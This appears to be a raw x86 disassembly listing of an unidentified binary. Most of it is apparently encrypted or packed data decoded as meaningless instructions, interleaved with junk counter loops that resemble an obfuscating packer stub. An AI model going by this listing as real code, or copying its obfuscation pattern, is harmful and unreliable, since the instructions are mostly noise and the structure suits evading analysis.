  407132:	imul   esi,ebp,0x62c5e1b7
  407138:	mov    BYTE PTR [esi+ecx*2-0x4],al
  40713c:	dec    ebx
  40713d:	icebp  
  40713e:	out    dx,eax
  40713f:	or     DWORD PTR [ecx-0x1a],eax
  407142:	cmp    al,dh
  407144:	inc    edx
  407145:	je     0x4070da
  407147:	repz pop edx
  407149:	mov    cl,0xcb
  40714b:	jmp    0x52b8ee4
  407150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407151:	or     DWORD PTR [edx+0x52eaf723],edx
  407157:	out    0x97,al
  407159:	(bad)  
  40715a:	cli    
  40715b:	pop    ss
  40715c:	call   0x619f343f
  407161:	(bad)  
  407162:	loop   0x40710c
  407164:	(bad)  
  407165:	adc    dh,BYTE PTR [ebp-0x496089ff]
  40716b:	repnz fsubr st,st(7)
  40716e:	xchg   DWORD PTR [eax-0x48],ebp
  407171:	mov    al,ds:0x4b726795
  407176:	adc    al,cl
  407178:	pushf  
  407179:	push   ebp
  40717b:	scas   al,BYTE PTR es:[edi]
  40717c:	xchg   ebx,eax
  40717d:	les    ecx,FWORD PTR [edx-0x15]
  407180:	mov    ?,WORD PTR [ebx-0x74]
  407183:	aas    
  407184:	push   eax
  407185:	test   al,0xe6
  407187:	ret    0x36df
  40718a:	add    edi,esi
  40718c:	push   edi
  40718d:	sbb    BYTE PTR [ecx-0x13],0x56
  407191:	sbb    dh,BYTE PTR [esi+0x23]
  407194:	sub    esi,edx
  407196:	test   DWORD PTR gs:[ebx],ebp
  407199:	push   ds
  40719a:	mov    ah,0xdc
  40719c:	rcr    DWORD PTR [esp+eiz*4],1
  40719f:	or     bl,BYTE PTR [ecx-0x37]
  4071a2:	mov    ebx,0x8eafe9d2
  4071a7:	ror    DWORD PTR [edi],1
  4071a9:	(bad)  
  4071aa:	mov    edx,0x9022ec4c
  4071af:	push   esp
  4071b0:	lahf   
  4071b1:	xchg   DWORD PTR [ebx],edi
  4071b3:	pop    ebp
  4071b4:	mov    BYTE PTR [eax],dh
  4071b6:	in     al,0x1d
  4071b8:	push   ecx
  4071b9:	push   esi
  4071ba:	dec    ebx
  4071bb:	or     edx,esi
  4071bd:	adc    DWORD PTR [ebp+0x35],ecx
  4071c0:	daa    
  4071c1:	int    0x58
  4071c3:	sbb    BYTE PTR [ebx-0x15],al
  4071c6:	mov    edx,DWORD PTR [eax-0x754b32f6]
  4071cc:	xor    dh,BYTE PTR ds:0x197692f4
  4071d2:	sbb    DWORD PTR ds:0x941a321a,ebp
  4071d8:	or     BYTE PTR [edi+0x5e7958f5],cl
  4071de:	push   edi
  4071df:	scas   al,BYTE PTR es:[edi]
  4071e0:	mov    WORD PTR [edx],?
  4071e2:	(bad)  
  4071e4:	cmp    al,0x2c
  4071e6:	cmc    
  4071e7:	fwait
  4071e8:	push   0x363c4672
  4071ed:	leave  
  4071ee:	jns    0x407249
  4071f0:	mov    eax,0xfdea6f22
  4071f5:	fdivr  DWORD PTR [eax+0x620f17d9]
  4071fb:	mov    ds:0x90cbb68c,al
  407200:	(bad)  
  407201:	sub    ah,BYTE PTR [ebp+eiz*2-0x4f109e3e]
  407208:	or     eax,0xb7b833d5
  40720d:	cmp    al,0x88
  40720f:	clc    
  407210:	dec    eax
  407211:	xor    eax,0xa7d7f3f
  407216:	push   ebp
  407217:	imul   eax,DWORD PTR [eax+0xeb41532],0x8f9f4096
  407221:	cmp    eax,0x5148791d
  407226:	mov    ds:0xf6bb56c6,al
  40722b:	popf   
  40722c:	jns    0x407274
  40722e:	push   edi
  40722f:	int3   
  407230:	mov    ah,0xb0
  407232:	mov    esi,0x4173c078
  407237:	enter  0x189f,0xd5
  40723b:	out    0x7a,eax
  40723d:	nop
  40723e:	shl    DWORD PTR [ebx+ebp*4+0x3ad6b915],0xc1
  407246:	(bad)  
  407247:	sbb    eax,0xb35aa725
  40724c:	popf   
  40724d:	out    dx,al
  40724e:	stos   BYTE PTR es:[edi],al
  40724f:	in     eax,0x6b
  407251:	cmp    al,0xe4
  407253:	sub    BYTE PTR [esi-0x6b],0x7a
  407257:	dec    esi
  407258:	loope  0x4071fe
  40725a:	cmp    BYTE PTR [esi-0xcf1a603],dh
  407260:	popa   
  407261:	push   edx
  407262:	sub    al,0x8a
  407264:	fisubr WORD PTR [eax-0x60cc2731]
  40726a:	dec    edi
  40726b:	shl    edx,0x55
  40726e:	int3   
  40726f:	scas   al,BYTE PTR es:[edi]
  407270:	imul   ebx,DWORD PTR [ebx],0xa
  407273:	pop    ss
  407274:	add    DWORD PTR [ecx-0x4a],esi
  407277:	outs   dx,DWORD PTR ds:[esi]
  407278:	mov    ebx,0x740ca165
  40727d:	mov    bh,0x63
  40727f:	inc    ebp
  407280:	cmc    
  407281:	mov    dl,BYTE PTR [ebx+0x4493069e]
  407287:	(bad)  
  407288:	xchg   esi,eax
  407289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40728a:	out    dx,al
  40728b:	inc    edi
  40728c:	xchg   edi,eax
  40728d:	push   cs
  40728e:	ficom  WORD PTR [eax]
  407290:	add    cl,BYTE PTR [edi+0x5af4f312]
  407296:	fist   WORD PTR [esi]
  407298:	xor    al,0x0
  40729a:	iret   
  40729b:	sbb    dl,al
  40729d:	mov    eax,ds:0x6edf8205
  4072a2:	adc    edi,esi
  4072a4:	adc    ch,BYTE PTR [ecx-0x2f43a64]
  4072aa:	mov    BYTE PTR [ecx],ch
  4072ac:	sbb    bh,BYTE PTR [ebx+0x5544ebe5]
  4072b2:	cmp    al,0x44
  4072b4:	jbe    0x407251
  4072b6:	jae    0x4072c5
  4072b8:	loope  0x407286
  4072ba:	add    BYTE PTR [esi],ch
  4072bc:	sub    cl,BYTE PTR [edx+0x21]
  4072bf:	(bad)  
  4072c0:	fs sar dh,0x6a
  4072c4:	cmpxchg ah,ch
  4072c7:	addr16 push cs
  4072c9:	sub    eax,0x23c1d952
  4072ce:	xchg   edi,esi
  4072d0:	cs aam 0x87
  4072d3:	mov    eax,ds:0xf3799a4d
  4072d8:	nop
  4072d9:	mov    ebx,0xc5e03a2
  4072de:	sub    al,0xd9
  4072e0:	loop   0x40726d
  4072e2:	out    0x8,eax
  4072e4:	and    eax,0x6598c4e7
  4072e9:	sbb    BYTE PTR [ebx],0xe1
  4072ec:	cld    
  4072ed:	call   0x9185a708
  4072f2:	mov    ah,0x2a
  4072f4:	mov    bh,0x20
  4072f6:	ja     0x407278
  4072f8:	mov    ah,0xc0
  4072fa:	push   0x88e2b45
  4072ff:	rcl    BYTE PTR [ecx],cl
  407301:	outs   dx,DWORD PTR ds:[esi]
  407302:	stos   BYTE PTR es:[edi],al
  407303:	xor    DWORD PTR [ecx-0x6524ac65],ebp
  407309:	inc    ebp
  40730a:	sti    
  40730b:	or     dl,bh
  40730d:	or     bl,ah
  40730f:	addr16 mov esp,0x6c9988d2
  407315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407316:	add    eax,0xdc4320ec
  40731b:	pop    edx
  40731c:	stc    
  40731d:	js     0xd4b6
  407322:	xchg   DWORD PTR [ebp-0x9],esp
  407325:	mov    esp,ebp
  407327:	rol    DWORD PTR [eax],0x76
  40732a:	in     al,dx
  40732b:	adc    eax,0xffffffbb
  40732e:	push   esi
  40732f:	stos   BYTE PTR es:[edi],al
  407330:	xor    al,0x8c
  407332:	sbb    DWORD PTR gs:[edi],ecx
  407335:	mov    esi,0x461680e8
  40733a:	jg     0x4072bd
  40733c:	and    dh,BYTE PTR [ebx]
  40733e:	dec    eax
  40733f:	push   edx
  407340:	cmp    BYTE PTR [edx],bh
  407342:	mov    cl,0x33
  407344:	in     al,dx
  407345:	ins    DWORD PTR es:[edi],dx
  407346:	xchg   edx,eax
  407347:	fiadd  WORD PTR [edi+0x2202aa8a]
  40734d:	mov    esp,DWORD PTR [edx]
  40734f:	jg     0x4072fd
  407351:	jecxz  0x407346
  407353:	mov    bl,0xad
  407355:	jns    0x407396
  407357:	adc    BYTE PTR ds:0x52c643cb,cl
  40735d:	(bad)  
  40735e:	bound  ebx,QWORD PTR [esi+0x4a]
  407361:	mov    esi,0x35c7a012
  407366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407367:	jmp    0xe62a:0x9c0acdc1
  40736e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40736f:	push   ecx
  407370:	jle    0x4073d6
  407372:	inc    ebx
  407373:	mov    ecx,0x666a5a10
  407378:	sub    al,0xe0
  40737a:	adc    esp,DWORD PTR [ebx+edx*1+0x77]
  40737e:	pop    eax
  40737f:	ins    BYTE PTR es:[edi],dx
  407380:	outs   dx,DWORD PTR ds:[esi]
  407381:	lods   al,BYTE PTR ds:[esi]
  407382:	pop    ss
  407383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407384:	out    dx,eax
  407385:	xor    bh,BYTE PTR [ebp+0x3f4276bb]
  40738b:	enter  0xa006,0xb4
  40738f:	stos   BYTE PTR es:[edi],al
  407390:	fst    QWORD PTR [eax]
  407392:	sub    ebp,DWORD PTR [ecx-0x2cc6f2b9]
  407398:	jp     0x407398
  40739a:	add    eax,0x3a387468
  40739f:	push   ss
  4073a0:	test   eax,0xb14a1002
  4073a5:	dec    ecx
  4073a6:	cmc    
  4073a7:	gs push 0xad9e2c5f
  4073ad:	push   0x6
  4073af:	mov    esi,0x9cbf7d48
  4073b4:	pop    eax
  4073b5:	ss cli 
  4073b7:	int3   
  4073b8:	lods   al,BYTE PTR ds:[esi]
  4073b9:	icebp  
  4073ba:	mov    eax,ds:0xf14d0fa1
  4073bf:	mov    ebx,0x2d32cec7
  4073c4:	jne    0x407424
  4073c6:	cli    
  4073c7:	mov    dl,0x13
  4073c9:	cs mov esi,0x1de64267
  4073cf:	loop   0x4073a4
  4073d1:	jae    0x4073ba
  4073d3:	retf   0x2ad9
  4073d6:	or     al,0x52
  4073d8:	sbb    BYTE PTR [edi+0xd],0x7b
  4073dc:	ins    BYTE PTR es:[edi],dx
  4073dd:	stos   DWORD PTR es:[edi],eax
  4073de:	mov    ds:0x6eb44c36,eax
  4073e3:	mov    bh,0x6a
  4073e5:	out    0xb0,al
  4073e7:	rcl    BYTE PTR [ebx-0x6f44ada5],1
  4073ed:	retf   0x7a26
  4073f0:	xor    edi,ebp
  4073f2:	and    BYTE PTR [edx+0x28d571c5],0x47
  4073f9:	add    BYTE PTR [edx+0x36],cl
  4073fc:	aam    0x85
  4073fe:	cli    
  4073ff:	add    cl,BYTE PTR ds:0x70773765
  407405:	jno    0x4073db
  407407:	test   eax,0x7bb1f616
  40740c:	mov    eax,0x3c134acc
  407411:	inc    esi
  407412:	retf   
  407413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407415:	ss sbb esp,eax
  407418:	sbb    ch,BYTE PTR [esi-0x2164dcf9]
  40741e:	adc    DWORD PTR [ebx],0x46
  407421:	test   al,0xfa
  407423:	push   ebp
  407424:	pop    eax
  407425:	inc    esp
  407426:	int    0x54
  407428:	pop    ss
  407429:	stc    
  40742a:	adc    DWORD PTR [edx+0x44],0xaa8e63dd
  407431:	xor    ah,BYTE PTR [edx+0x39663801]
  407437:	xchg   ebp,eax
  407438:	and    ecx,DWORD PTR ds:0x3282ed60
  40743e:	popf   
  40743f:	or     edx,DWORD PTR [ecx-0x3d]
  407442:	and    esi,esp
  407444:	cmp    al,dh
  407446:	call   0x738c:0x7a5ab4ce
  40744d:	xchg   esi,eax
  40744e:	stos   BYTE PTR es:[edi],al
  40744f:	call   FWORD PTR [esi+0x18]
  407452:	shl    DWORD PTR [ebx+0x906a0cf],1
  407458:	mov    ds:0xf28237d2,eax
  40745d:	push   esi
  40745e:	scas   eax,DWORD PTR es:[edi]
  40745f:	push   es
  407460:	stos   BYTE PTR es:[edi],al
  407461:	pop    ebx
  407462:	cmp    DWORD PTR [eax-0x18],0xb94bd649
  407469:	push   ss
  40746a:	arpl   WORD PTR [eax+eax*1-0x17ef7c58],ax
  407471:	sub    eax,0xd3d62e68
  407476:	add    BYTE PTR [ebx-0x77],0x47
  40747a:	adc    ecx,edi
  40747c:	arpl   WORD PTR [esi+esi*4-0x35],sp
  407480:	pop    ebx
  407481:	cdq    
  407482:	push   ebx
  407483:	mov    DWORD PTR ds:0x433597,0x17
  40748d:	cmp    DWORD PTR ds:0x433597,0x0
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433597,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433597,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433597
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433597,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433597
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433597,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x4335ab
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x4335ab,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	mov    DWORD PTR [ebx+0x21],0x7cc856fd
  407508:	jl     0x4074e1
  40750a:	jns    0x407588
  40750c:	jl     0x40758d
  40750e:	mov    BYTE PTR [esi+0x5408cf0a],0x19
  407515:	mov    edx,0xc2424bc8
  40751a:	(bad)
  40751d:	mov    ebp,0xefe3072a
  407522:	push   edx
  407523:	cli    
  407524:	jbe    0x407551
  407526:	cli    
  407527:	xor    esi,edx
  407529:	jb     0x4074c0
  40752b:	push   ss
  40752c:	add    edi,DWORD PTR [ebp+0x79]
  40752f:	fsub   QWORD PTR [ebp-0x57]
  407532:	iret   
  407533:	push   es
  407534:	xor    esp,DWORD PTR [ebx]
  407536:	(bad)  
  407537:	jmp    0x1115:0x5584d9c4
  40753e:	out    dx,eax
  40753f:	sbb    ecx,DWORD PTR [edx-0x5d]
  407542:	mov    WORD PTR [ecx-0xd12ee2d],ss
  407548:	stos   BYTE PTR es:[edi],al
  407549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40754a:	dec    edx
  40754b:	inc    esp
  40754c:	mov    eax,0x31b61ae5
  407551:	or     cl,ch
  407553:	sbb    BYTE PTR [edx-0x6d],0x61
  407557:	aaa    
  407558:	not    BYTE PTR [edx-0x40]
  40755b:	fisub  WORD PTR [ebx]
  40755d:	(bad)  
  40755f:	fisubr DWORD PTR [esi+0x25]
  407562:	sbb    al,0x2e
  407564:	sub    ebp,ebp
  407566:	out    dx,eax
  407567:	adc    BYTE PTR [edx],ch
  407569:	mov    eax,ds:0xcc657d9b
  40756e:	aas    
  40756f:	xchg   ebx,eax
  407570:	mov    edi,es
  407572:	push   eax
  407573:	sahf   
  407574:	fnsave [eax-0x5d4dffe3]
  40757a:	adc    esi,eax
  40757c:	ins    BYTE PTR es:[edi],dx
  40757d:	adc    eax,0xb02dce3f
  407582:	icebp  
  407583:	int    0xdb
  407585:	mov    eax,ds:0xed130629
  40758a:	add    esi,DWORD PTR [edi]
  40758c:	jae    0x40757e
  40758e:	jmp    0x5bf4f961
  407593:	bts    DWORD PTR [eax],ecx
  407596:	fs mov cl,0xf6
  407599:	cmc    
  40759a:	jmp    0x4075e3
  40759c:	call   0x5227:0xd8da0240
  4075a3:	push   es
  4075a4:	out    0xf7,al
  4075a6:	mov    edi,DWORD PTR [edi]
  4075a8:	aam    0x61
  4075aa:	mov    dl,0x3d
  4075ac:	push   eax
  4075ad:	js     0x407543
  4075af:	add    eax,0x6ab23091
  4075b4:	cli    
  4075b5:	test   al,0x17
  4075b7:	jle    0x4075da
  4075b9:	sub    al,0x66
  4075bb:	and    DWORD PTR [esi-0x555e6318],edx
  4075c1:	pop    eax
  4075c2:	mov    dl,0x92
  4075c4:	lods   al,BYTE PTR ds:[esi]
  4075c5:	adc    ah,bl
  4075c7:	cdq    
  4075c8:	jge    0x40763d
  4075ca:	mov    cl,BYTE PTR [edx]
  4075cc:	adc    eax,0x1d020cd6
  4075d1:	(bad)  
  4075d2:	ror    BYTE PTR [edx],1
  4075d4:	cmp    ch,bh
  4075d6:	and    dl,BYTE PTR [esi]
  4075d8:	ror    al,cl
  4075da:	xlat   BYTE PTR ds:[ebx]
  4075db:	inc    eax
  4075dc:	iret   
  4075dd:	outs   dx,DWORD PTR ds:[esi]
  4075de:	push   ebp
  4075df:	(bad)  
  4075e0:	cli    
  4075e1:	and    BYTE PTR [ebx],dl
  4075e3:	cs xchg edx,eax
  4075e5:	call   0x5e50:0x8e85ccf7
  4075ec:	jl     0x40760e
  4075ee:	stos   DWORD PTR es:[edi],eax
  4075ef:	test   al,0xa2
  4075f1:	mov    eax,ds:0x87e8fd7f
  4075f6:	int    0x13
  4075f8:	xchg   edi,eax
  4075f9:	or     cl,BYTE PTR ds:0x4184fd2f
  4075ff:	fidivr WORD PTR [esi+0x75]
  407602:	bnd jns 0x40766f
  407605:	add    BYTE PTR [ebx+0x57561bb9],0x72
  40760c:	push   ds
  40760d:	add    BYTE PTR [esi],bl
  40760f:	pop    es
  407610:	xor    DWORD PTR [ecx+eax*1],ecx
  407613:	int3   
  407614:	shl    BYTE PTR [edx],0x14
  407617:	(bad)  
  407618:	loop   0x40760d
  40761a:	and    DWORD PTR [ecx+ebx*1-0x33],ebx
  40761e:	(bad)  
  40761f:	(bad)  
  407620:	fwait
  407621:	std    
  407622:	and    BYTE PTR [ecx+0x2f7de731],al
  407628:	jmp    0xe6cb:0x8bd7aab2
  40762f:	xchg   ebx,eax
  407630:	psadbw mm7,QWORD PTR [ecx-0x77]
  407634:	out    dx,al
  407635:	in     eax,0xc4
  407637:	jp     0x407640
  407639:	push   edx
  40763a:	sbb    BYTE PTR [ebp+ebx*1+0x3334c1c4],0xc8
  407642:	sub    BYTE PTR [edx-0x18],dh
  407645:	mov    cl,0x9d
  407647:	jae    0x4076b0
  407649:	mov    ds:0x7b28ffb5,eax
  40764e:	pop    ebp
  40764f:	pop    ds
  407650:	mov    gs,WORD PTR [edx+0x1e]
  407653:	or     dh,al
  407655:	pushf  
  407656:	sbb    dl,bh
  407658:	inc    DWORD PTR [esi-0x75]
  40765b:	jge    0x4076bf
  40765d:	jbe    0x40768f
  40765f:	xor    BYTE PTR [ebp-0x57ea2b53],cl
  407665:	into   
  407666:	call   0xf45f:0xc6bbce69
  40766d:	in     eax,0x33
  40766f:	enter  0x7033,0x58
  407673:	stc    
  407674:	test   BYTE PTR [ebp-0x64],0xbc
  407678:	popf   
  407679:	pop    es
  40767a:	call   0xbde5b56c
  40767f:	mov    DWORD PTR [ebp+0x1110b0fb],esp
  407685:	lahf   
  407686:	test   BYTE PTR [ecx+0x575879ab],0xf
  40768d:	std    
  40768e:	jbe    0x407637
  407690:	sbb    eax,DWORD PTR [eax+0x75]
  407693:	das    
  407694:	mov    eax,ds:0xe52578ee
  407699:	or     dh,BYTE PTR [esi]
  40769b:	adc    BYTE PTR [ebx-0x790c81bc],cl
  4076a1:	pushf  
  4076a2:	mov    dl,0x5b
  4076a4:	xor    DWORD PTR [esi+0x7c],ebp
  4076a7:	leave  
  4076a8:	or     esi,DWORD PTR [edi-0x38]
  4076ab:	sbb    DWORD PTR ss:[ebx],0xee479646
  4076b2:	mov    ebx,0x32f4d65a
  4076b7:	mov    ebp,0x29392992
  4076bc:	cwde   
  4076bd:	cs jl  0x407682
  4076c0:	add    eax,0xe48520a8
  4076c5:	(bad)  
  4076c7:	sub    DWORD PTR [edi+0x50],edx
  4076ca:	and    al,0x1c
  4076cc:	sar    BYTE PTR [ecx-0x748213d2],cl
  4076d2:	out    0xc9,al
  4076d4:	aad    0x91
  4076d6:	pop    esi
  4076d7:	inc    dh
  4076d9:	test   ch,dh
  4076db:	push   es
  4076dc:	or     bh,ah
  4076de:	jmp    0x407671
  4076e0:	bound  ebp,QWORD PTR [ebx]
  4076e2:	pusha  
  4076e3:	test   eax,0x724e9a42
  4076e8:	pop    ecx
  4076e9:	dec    esi
  4076ea:	sub    edx,eax
  4076ec:	jge    0x407747
  4076ee:	adc    al,BYTE PTR [ebx]
  4076f0:	xor    al,0x52
  4076f2:	inc    eax
  4076f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076f4:	adc    eax,0x2d8aa078
  4076f9:	jl     0x40774e
  4076fb:	or     edx,DWORD PTR [ecx+0x2d7d0bea]
  407701:	rcl    BYTE PTR [eax-0xb],cl
  407704:	sub    eax,0xe0efa415
  407709:	jmp    0x4076c5
  40770b:	idiv   BYTE PTR [esp+ecx*1-0x7f]
  40770f:	les    eax,FWORD PTR [ecx]
  407711:	fbstp  TBYTE PTR [edi+0x24a19993]
  407717:	in     eax,0xd9
  407719:	and    esi,DWORD PTR [edi]
  40771b:	call   0xaf6d61fc
  407720:	push   edi
  407721:	in     eax,0x21
  407723:	cmp    DWORD PTR [ecx+0x7c59dd5c],edi
  407729:	mov    BYTE PTR [edx+0x5dd69728],0x1a
  407730:	add    eax,0x849cda3c
  407735:	ror    BYTE PTR [ecx+edx*4+0x5368c3ff],cl
  40773c:	sbb    ebp,DWORD PTR [ecx+0x51]
  40773f:	ror    BYTE PTR ss:[ebx-0x46dcb244],0x5b
  407747:	hlt    
  407748:	int3   
  407749:	xor    BYTE PTR [ecx+edx*4-0x6d],dl
  40774d:	imul   edi,DWORD PTR [esi],0x4af095d1
  407753:	hlt    
  407754:	or     BYTE PTR [edi-0x6726222d],0x62
  40775b:	rcr    edx,cl
  40775d:	outs   dx,DWORD PTR ds:[esi]
  40775e:	mov    esi,0x57ef3993
  407763:	aas    
  407764:	inc    esi
  407765:	imul   esp,ebx,0x47057c28
  40776b:	adc    al,0xa2
  40776d:	aad    0x8b
  40776f:	fsubr  DWORD PTR [esi-0x10]
  407772:	xor    DWORD PTR [edi+0x423a664],esi
  407778:	mov    edx,0x1b37ab
  40777d:	mov    esi,0x96952625
  407782:	inc    ecx
  407783:	in     eax,dx
  407784:	xchg   ebx,eax
  407785:	leave  
  407786:	and    DWORD PTR [ebx-0x2c1f2ac9],ebp
  40778c:	fbstp  TBYTE PTR [edi-0x77]
  40778f:	ja     0x4077e9
  407791:	inc    eax
  407792:	inc    ebx
  407793:	mov    eax,ds:0x4669a2ed
  407798:	mov    al,ds:0x10d6a43
  40779d:	jns    0x4077df
  40779f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077a0:	mov    edi,0xfea094c1
  4077a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077a6:	aaa    
  4077a7:	mov    al,ds:0xeae0a9ab
  4077ac:	lock mov ecx,0x2f68c37e
  4077b2:	in     eax,dx
  4077b3:	repnz aad 0xe4
  4077b6:	add    BYTE PTR [edx+0x2d],0x4
  4077ba:	int3   
  4077bb:	clc    
  4077bc:	mov    ?,WORD PTR [ebx+0x3c203888]
  4077c2:	pop    ebp
  4077c3:	fcom   DWORD PTR [eax]
  4077c5:	xchg   ebp,eax
  4077c6:	push   ss
  4077c7:	sbb    al,0xcd
  4077c9:	cmp    BYTE PTR [eax+0x36],ch
  4077cc:	fnstenv [ecx]
  4077ce:	scas   al,BYTE PTR es:[edi]
  4077cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077d0:	inc    ebp
  4077d1:	and    ah,BYTE PTR [edi+0x33c5146a]
  4077d7:	jp     0x4077e8
  4077d9:	jno    0x4077ec
  4077db:	or     eax,0xca9d4bc9
  4077e0:	push   ebp
  4077e1:	xchg   esi,eax
  4077e2:	and    esp,DWORD PTR [eax-0x61]
  4077e5:	mov    ds:0xe5e08456,al
  4077ea:	ja     0x407832
  4077ec:	and    bh,bh
  4077ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077ef:	popf   
  4077f0:	xchg   esi,eax
  4077f1:	cmp    eax,0xf60f83a0
  4077f6:	adc    edi,DWORD PTR cs:[ebx]
  4077f9:	popa   
  4077fa:	pop    ds
  4077fb:	in     al,dx
  4077fc:	pop    es
  4077fd:	test   ecx,ecx
  4077ff:	test   edx,edx
  407801:	lds    esp,FWORD PTR [edx]
  407803:	xchg   ebp,eax
  407804:	fsubrp st(6),st
  407806:	dec    edx
  407807:	mov    WORD PTR [ebp-0x56],?
  40780a:	test   BYTE PTR [eax],0x9
  40780d:	sub    eax,0x2aa14a22
  407812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407813:	mov    ah,0xa5
  407815:	std    
  407816:	mov    dh,0xef
  407818:	mov    BYTE PTR [edx],ch
  40781a:	sub    ebx,DWORD PTR [edx+eiz*8+0x18]
  40781e:	pop    ebp
  40781f:	cld    
  407820:	or     ah,BYTE PTR [ebx+0x3]
  407823:	cmc    
  407824:	popf   
  407825:	daa    
  407826:	cs es jnp 0x407805
  40782a:	mov    dl,0xe1
  40782c:	xor    BYTE PTR ds:0xf243a36c,bl
  407832:	cs xchg ah,ah
  407835:	cmp    esp,DWORD PTR es:[ecx-0x36a00584]
  40783c:	icebp  
  40783d:	or     BYTE PTR [edx+0x6c],ch
  407840:	dec    esp
  407841:	idiv   DWORD PTR [eax+eiz*2+0x1286d1ff]
  407848:	(bad)  
  407849:	mov    al,ds:0xb2ab9de4
  40784e:	pusha  
  40784f:	jge    0x4078cd
  407851:	inc    esi
  407852:	neg    DWORD PTR ds:0x4bc1597
  407858:	push   eax
  407859:	xchg   ecx,eax
  40785a:	push   ss
  40785b:	jns    0x4078c2
  40785d:	xor    ebp,edx
  40785f:	push   esi
  407860:	fsubr  DWORD PTR [ecx-0x5ecf0b57]
  407866:	mov    eax,DWORD PTR [ebp-0x1c]
  407869:	and    DWORD PTR ds:0x433617,0x0
  407873:	mov    ebx,DWORD PTR ds:0x433617
  407879:	inc    ebx
  40787a:	mov    DWORD PTR ds:0x433617,ebx
  407880:	cmp    DWORD PTR ds:0x433617,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433617,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433617
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433617,ebx
  4078b0:	cmp    DWORD PTR ds:0x433617,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x43354b,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x4335eb,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x4335eb
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x4335eb,edi
  4078e1:	cmp    DWORD PTR ds:0x4335eb,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x4335eb,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433814
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x4335eb,0x7
  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x4335eb
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x4335eb,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x43354b,0x19
  407943:	cmp    DWORD PTR ds:0x43354b,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x43354b,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x43354b,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x43354b
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x43354b,edi
  407988:	mov    edi,DWORD PTR ds:0x43354b
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x43354b,edi
  407995:	jmp    0x407943
  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x4335ef
  4079a2:	or     edi,DWORD PTR ds:0x433663
  4079a8:	mov    DWORD PTR ds:0x4335ef,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x4335b3,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x4335b3
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x4335b3,esi
  4079cf:	cmp    DWORD PTR ds:0x4335b3,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x4335b3,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
